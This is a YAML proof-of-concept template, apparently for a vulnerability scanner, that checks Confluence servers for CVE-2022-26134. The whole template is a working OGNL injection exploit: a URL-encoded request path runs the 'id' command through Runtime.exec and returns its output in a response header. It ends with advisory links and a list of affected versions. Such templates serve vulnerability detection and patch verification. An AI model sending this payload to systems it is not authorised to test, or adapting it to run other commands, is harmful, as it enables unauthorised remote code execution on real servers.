name: poc-yaml-confluence-cve-2022-26134
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
            follow_redirects: false
        expression: response.status == 302 && response.headers["X-Cmd-Response"].contains("uid") && response.headers["X-Cmd-Response"].contains("gid")
expression: r0()
detail:
    author: Soveless(https://github.com/Soveless)
    links:
        - https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134
        - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
        - https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis
    Affected Version: Confluence Server and Data Center >= 1.3.0 < 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1
